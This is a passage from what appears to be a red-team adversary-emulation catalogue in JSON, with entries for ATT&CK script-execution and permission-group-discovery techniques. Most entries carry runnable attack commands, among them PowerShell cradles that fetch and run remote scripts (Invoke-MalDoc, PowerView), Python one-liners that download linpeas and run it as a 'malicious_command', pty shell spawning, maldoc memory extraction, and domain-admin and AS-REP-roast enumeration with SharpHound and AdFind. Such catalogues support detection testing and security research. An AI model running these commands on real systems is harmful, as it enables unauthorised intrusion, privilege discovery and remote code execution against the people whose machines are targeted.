      "description": "Visual Basic execution test, execute vbscript via PowerShell.\n\nWhen successful, system information will be written to $env:TEMP\\T1059.005.out.txt.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cscript \"#{vbscript}\" > $env:TEMP\\T1059.005.out.txt\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item $env:TEMP\\T1059.005.out.txt -ErrorAction Ignore"
      },
      "variables": [
        {
          "name": "vbscript",
          "description": "Path to sample script",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1059.005\\src\\sys_info.vbs"
        }
      ],
      "prerequisites": [
        {
          "description": "Sample script must exist on disk at specified location (#{vbscript})",
          "check_command": "if (Test-Path \"#{vbscript}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -ItemType Directory (Split-Path \"#{vbscript}\") -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1059.005/src/sys_info.vbs\" -OutFile \"#{vbscript}\""
        }
      ],
      "rx_module_id": "1620de42-160a-4fe5-bbaf-d3fef0181ce9",
      "module_name": "Visual Basic script execution to gather local computer information"
    },
    {
      "index": 380,
      "technique_id": "T1059.005",
      "technique_name": "Command and Scripting Interpreter: Visual Basic",
      "description": "This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution\na message box will pop up displaying \"ART T1059.005\"\n\nA note regarding this module, due to the way that this module utilizes \"ScriptControl\" a 64bit version of Microsoft Office is required.\nYou can validate this by opening WinWord -> File -> Account -> About Word\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToRagloxModulesFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\"\n",
        "elevation_required": false,
        "cleanup_command": "Get-WmiObject win32_process | Where-Object {$_.CommandLine -like \"*mshta*\"}  | % { \"$(Stop-Process $_.ProcessID)\" } | Out-Null\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "The 64-bit version of Microsoft Office must be installed\n",
          "check_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Word (64-bit) manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "e8209d5f-e42d-45e6-9c2f-633ac4f1eefa",
      "module_name": "Encoded VBS code execution"
    },
    {
      "index": 381,
      "technique_id": "T1059.005",
      "technique_name": "Command and Scripting Interpreter: Visual Basic",
      "description": "This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this\nwe first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that\nmemory location to a file stored in the $env:TEMP\\raglox_t1059_005_test_output.bin.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToRagloxModulesFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"$env:TEMP\\raglox_t1059_005_test_output.bin\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "ms_product",
          "description": "Maldoc application Word",
          "type": "string",
          "default_value": "Word"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft #{ms_product} must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "8faff437-a114-4547-9a60-749652a03df6",
      "module_name": "Extract Memory via VBA"
    },
    {
      "index": 382,
      "technique_id": "T1059.006",
      "technique_name": "Command and Scripting Interpreter: Python",
      "description": "Download and execute shell script and write to file then execute locally using Python -c (command mode)",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n",
        "elevation_required": false,
        "cleanup_command": "rm #{payload_file_name} \npip-autoremove pypykatz >nul 2> nul\n"
      },
      "variables": [
        {
          "name": "script_url",
          "description": "Shell script public URL",
          "type": "string",
          "default_value": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
        },
        {
          "name": "payload_file_name",
          "description": "Name of shell script downloaded from the script_url",
          "type": "string",
          "default_value": "T1059.006-payload"
        },
        {
          "name": "executor",
          "description": "FreeBSD or Linux shell",
          "type": "string",
          "default_value": "sh"
        },
        {
          "name": "script_args",
          "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files.",
          "type": "string",
          "default_value": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
        }
      ],
      "prerequisites": [
        {
          "description": "Verify if python is in the environment variable path and attempt to import requests library.",
          "check_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n",
          "install_command": "pip install requests\n"
        }
      ],
      "rx_module_id": "3a95cdb2-c6ea-4761-b24e-02b71889b8bb",
      "module_name": "Execute shell script via python's command mode arguement"
    },
    {
      "index": 383,
      "technique_id": "T1059.006",
      "technique_name": "Command and Scripting Interpreter: Python",
      "description": "Create Python file (.py) that downloads and executes shell script via executor arguments",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > #{python_script_name}\necho 'import os' >> #{python_script_name}\necho 'url = \"#{script_url}\"' >> #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name}\necho 'session = requests.session()' >> #{python_script_name}\necho 'source = session.get(url).content' >> #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name}\necho 'fd.write(source)' >> #{python_script_name}\necho 'fd.close()' >> #{python_script_name}\necho 'os.system(malicious_command)' >> #{python_script_name}\n$which_python #{python_script_name}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{python_script_name} #{payload_file_name}  \n"
      },
      "variables": [
        {
          "name": "python_script_name",
          "description": "Python script name",
          "type": "path",
          "default_value": "T1059.006.py"
        },
        {
          "name": "script_url",
          "description": "Shell script public URL",
          "type": "string",
          "default_value": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
        },
        {
          "name": "payload_file_name",
          "description": "Shell script file name downloaded from the script_url",
          "type": "string",
          "default_value": "T1059.006-payload"
        },
        {
          "name": "executor",
          "description": "Payload or script interpreter / executor",
          "type": "string",
          "default_value": "sh"
        },
        {
          "name": "script_args",
          "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files",
          "type": "string",
          "default_value": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires Python\n",
          "check_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n",
          "install_command": "pip install requests    \n"
        }
      ],
      "rx_module_id": "6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8",
      "module_name": "Execute Python via scripts"
    },
    {
      "index": 384,
      "technique_id": "T1059.006",
      "technique_name": "Command and Scripting Interpreter: Python",
      "description": "Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > #{python_script_name}\necho 'import os' >> #{python_script_name}\necho 'url = \"#{script_url}\"' >> #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name}\necho 'session = requests.session()' >> #{python_script_name}\necho 'source = session.get(url).content' >> #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name}\necho 'fd.write(source)' >> #{python_script_name}\necho 'fd.close()' >> #{python_script_name}\necho 'os.system(malicious_command)' >> #{python_script_name}\n$which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'\n$which_python #{python_binary_name}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{python_binary_name} #{python_script_name} #{payload_file_name}\n"
      },
      "variables": [
        {
          "name": "python_script_name",
          "description": "Name of Python script name",
          "type": "path",
          "default_value": "T1059.006.py"
        },
        {
          "name": "script_url",
          "description": "URL hosting external malicious payload",
          "type": "string",
          "default_value": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
        },
        {
          "name": "payload_file_name",
          "description": "Shell script file name downloaded from the script_url",
          "type": "string",
          "default_value": "T1059.006-payload"
        },
        {
          "name": "executor",
          "description": "Payload or script interpreter / executor",
          "type": "string",
          "default_value": "sh"
        },
        {
          "name": "script_args",
          "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files",
          "type": "string",
          "default_value": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
        },
        {
          "name": "python_binary_name",
          "description": "Name of Python file to be compiled",
          "type": "path",
          "default_value": "T1059.006.pyc"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires Python\n",
          "check_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n",
          "install_command": "pip install requests    \n"
        }
      ],
      "rx_module_id": "0b44d79b-570a-4b27-a31f-3bf2156e5eaa",
      "module_name": "Execute Python via Python executables"
    },
    {
      "index": 385,
      "technique_id": "T1059.006",
      "technique_name": "Command and Scripting Interpreter: Python",
      "description": "Uses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c \"import pty;pty.spawn('/bin/sh')\"\nexit\n$which_python -c \"import pty;pty.spawn('/bin/bash')\"\nexit",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Verify if python is in the environment variable path and attempt to import requests library.\n",
          "check_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?          \n",
          "install_command": "pip install requests\n"
        }
      ],
      "rx_module_id": "161d694c-b543-4434-85c3-c3a433e33792",
      "module_name": "Python pty module and spawn function used to spawn sh or bash"
    },
    {
      "index": 386,
      "technique_id": "T1059.007",
      "technique_name": "Command and Scripting Interpreter: JavaScript",
      "description": "JScript execution test, execute JScript via cscript command. When successful, system information will be written to $env:TEMP\\T1059.007.out.txt",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cscript \"#{jscript}\" > %tmp%\\T1059.007.out.txt\n",
        "elevation_required": false,
        "cleanup_command": "del %tmp%\\T1059.007.out.txt >nul 2>&1"
      },
      "variables": [
        {
          "name": "jscript",
          "description": "Path to sample script",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1059.007\\src\\sys_info.js"
        }
      ],
      "prerequisites": [
        {
          "description": "Sample script must exist on disk at specified location (#{jscript})",
          "check_command": "if (Test-Path \"#{jscript}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -ItemType Directory (Split-Path \"#{jscript}\") -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1059.007/src/sys_info.js\" -OutFile \"#{jscript}\""
        }
      ],
      "rx_module_id": "01d75adf-ca1b-4dd1-ac96-7c9550ad1035",
      "module_name": "JScript execution to gather local computer information via cscript"
    },
    {
      "index": 387,
      "technique_id": "T1059.007",
      "technique_name": "Command and Scripting Interpreter: JavaScript",
      "description": "JScript execution test, execute JScript via wscript command. When successful, system information will be shown with four message boxes.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wscript \"#{jscript}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "jscript",
          "description": "Path to sample script",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1059.007\\src\\sys_info.js"
        }
      ],
      "prerequisites": [
        {
          "description": "Sample script must exist on disk at specified location (#{jscript})",
          "check_command": "if (Test-Path \"#{jscript}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -ItemType Directory (Split-Path \"#{jscript}\") -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1059.007/src/sys_info.js\" -OutFile \"#{jscript}\""
        }
      ],
      "rx_module_id": "0709945e-4fec-4c49-9faf-c3c292a74484",
      "module_name": "JScript execution to gather local computer information via wscript"
    },
    {
      "index": 388,
      "technique_id": "T1059.010",
      "technique_name": "Command and Scripting Interpreter: AutoHotKey & AutoIT",
      "description": "An adversary may attempt to execute malicious script using AutoHotKey software instead of regular terminal like powershell or cmd. A messagebox will be displayed and calculator will popup when the script is executed successfully\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process -FilePath \"#{autohotkey_path}\" -ArgumentList \"#{script_path}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "script_path",
          "description": "AutoHotKey Script Path",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1059.010\\src\\calc.ahk"
        },
        {
          "name": "autohotkey_path",
          "description": "AutoHotKey Executable File Path",
          "type": "path",
          "default_value": "$PathToRagloxModulesFolder\\..\\ExternalPayloads\\ahk\\AutoHotKeyU64.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "AutoHotKey executable file must exist on disk at the specified location (#{autohotkey_path})\n",
          "check_command": "if(Test-Path \"#{autohotkey_path}\") {\n    exit 0\n} else {\n    exit 1\n}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$AutoHotKeyURL = \"https://www.autohotkey.com/download/ahk.zip\"\n$InstallerPath = \"$PathToRagloxModulesFolder\\..\\ExternalPayloads\"\nInvoke-WebRequest -Uri $AutoHotKeyURL -OutFile $InstallerPath\\ahk.zip\nExpand-Archive -Path $InstallerPath -Force;\n"
        }
      ],
      "rx_module_id": "7b5d350e-f758-43cc-a761-8e3f6b052a03",
      "module_name": "AutoHotKey script execution"
    },
    {
      "index": 389,
      "technique_id": "T1069.001",
      "technique_name": "Permission Groups Discovery: Local Groups",
      "description": "Permission Groups Discovery\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi;\ncat /etc/group\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "952931a4-af0b-4335-bbbe-73c8c5b327ae",
      "module_name": "Permission Groups Discovery (Local)"
    },
    {
      "index": 390,
      "technique_id": "T1069.001",
      "technique_name": "Permission Groups Discovery: Local Groups",
      "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net localgroup\nnet localgroup \"Administrators\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1f454dd6-e134-44df-bebb-67de70fb6cd8",
      "module_name": "Basic Permission Groups Discovery Windows (Local)"
    },
    {
      "index": 391,
      "technique_id": "T1069.001",
      "technique_name": "Permission Groups Discovery: Local Groups",
      "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "get-localgroup\nGet-LocalGroupMember -Name \"Administrators\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a580462d-2c19-4bc7-8b9a-57a41b7d3ba4",
      "module_name": "Permission Groups Discovery PowerShell (Local)"
    },
    {
      "index": 392,
      "technique_id": "T1069.001",
      "technique_name": "Permission Groups Discovery: Local Groups",
      "description": "This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -Path \"#{output_path}\" -ItemType Directory > $null\n& \"#{sharphound_path}\" -d \"#{domain}\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"#{output_path}\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Recurse #{output_path} -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "domain",
          "description": "FQDN of the targeted domain",
          "type": "string",
          "default_value": "$env:UserDnsDomain"
        },
        {
          "name": "sharphound_path",
          "description": "SharpHound Windows executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\SharpHound.exe"
        },
        {
          "name": "output_path",
          "description": "Output for SharpHound",
          "type": "path",
          "default_value": "$env:TEMP\\SharpHound\\"
        }
      ],
      "prerequisites": [
        {
          "description": "SharpHound binary must exist on disk and at specified location (#{sharphound_path}).\nAnd the computer must be domain joined (implicit authentication).\n",
          "check_command": "if (Test-Path \"#{sharphound_path}\") { exit 0 } else { exit 1 }\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/BloodHoundAD/BloodHound/blob/e062fe73d73c015dccb37fae5089342d009b84b8/Collectors/SharpHound.exe?raw=true\" -OutFile \"#{sharphound_path}\"\n"
        }
      ],
      "rx_module_id": "e03ada14-0980-4107-aff1-7783b2b59bb1",
      "module_name": "SharpHound3 - LocalAdmin"
    },
    {
      "index": 393,
      "technique_id": "T1069.001",
      "technique_name": "Permission Groups Discovery: Local Groups",
      "description": "Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic group get name\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7413be50-be8e-430f-ad4d-07bf197884b2",
      "module_name": "Wmic Group Discovery"
    },
    {
      "index": 394,
      "technique_id": "T1069.001",
      "technique_name": "Permission Groups Discovery: Local Groups",
      "description": "Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-WMIObject Win32_Group\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "69119e58-96db-4110-ad27-954e48f3bb13",
      "module_name": "WMIObject Group Discovery"
    },
    {
      "index": 395,
      "technique_id": "T1069.001",
      "technique_name": "Permission Groups Discovery: Local Groups",
      "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "sh",
        "command": "docker build -t t1069 $PathtoRAGLOX ModulesFolder/T1069.001/src/\ndocker run --name t1069_container --rm -d -t t1069\ndocker exec t1069_container ./test.sh",
        "elevation_required": false,
        "cleanup_command": "docker stop t1069_container\ndocker rmi -f t1069"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Verify docker is installed.",
          "check_command": "which docker\n",
          "install_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
        },
        {
          "description": "Verify docker service is running.",
          "check_command": "sudo systemctl status docker  --no-pager\n",
          "install_command": "sudo systemctl start docker\n"
        }
      ],
      "rx_module_id": "007d7aa4-8c4d-4f55-ba6a-7c965d51219c",
      "module_name": "Permission Groups Discovery for Containers- Local Groups"
    },
    {
      "index": 396,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net localgroup\nnet group /domain\nnet group \"enterprise admins\" /domain\nnet group \"domain admins\" /domain\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "dd66d77d-8998-48c0-8024-df263dc2ce5d",
      "module_name": "Basic Permission Groups Discovery Windows (Domain)"
    },
    {
      "index": 397,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "get-ADPrincipalGroupMembership #{user} | select name\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user",
          "description": "User to identify what groups a user is a member of",
          "type": "string",
          "default_value": "$env:USERNAME"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7",
      "module_name": "Permission Groups Discovery PowerShell (Domain)"
    },
    {
      "index": 398,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net groups \"Account Operators\" /domain\nnet groups \"Exchange Organization Management\" /domain\nnet group \"BUILTIN\\Backup Operators\" /domain\nnet group \"Domain Admins\" /domain\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0afb5163-8181-432e-9405-4322710c0c37",
      "module_name": "Elevated group enumeration using net group (Domain)"
    },
    {
      "index": 399,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a2d71eee-a353-4232-9f86-54f4288dd8c1",
      "module_name": "Find machines where user has local admin access (PowerView)"
    },
    {
      "index": 400,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd",
      "module_name": "Find local admins on all machines in domain (PowerView)"
    },
    {
      "index": 401,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "computer_name",
          "description": "hostname of the computer to analyze",
          "type": "path",
          "default_value": "$env:COMPUTERNAME"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "64fdb43b-5259-467a-b000-1b02c00e510a",
      "module_name": "Find Local Admins via Group Policy (PowerView)"
    },
    {
      "index": 402,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "When successful, accounts that do not require kerberos pre-auth will be returned\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Computer must be domain joined.\n",
          "check_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Joining this computer to a domain must be done manually.\n"
        },
        {
          "description": "Requires the Active Directory module for powershell to be installed.\n",
          "check_command": "if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n",
          "install_command": "Add-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n"
        }
      ],
      "rx_module_id": "870ba71e-6858-4f6d-895c-bb6237f6121b",
      "module_name": "Enumerate Users Not Requiring Pre Auth (ASRepRoast)"
    },
    {
      "index": 403,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group) #{optional_args}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "optional_args",
          "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "AdFind.exe must exist on disk at specified location (PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1087.002/bin/AdFind.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
        }
      ],
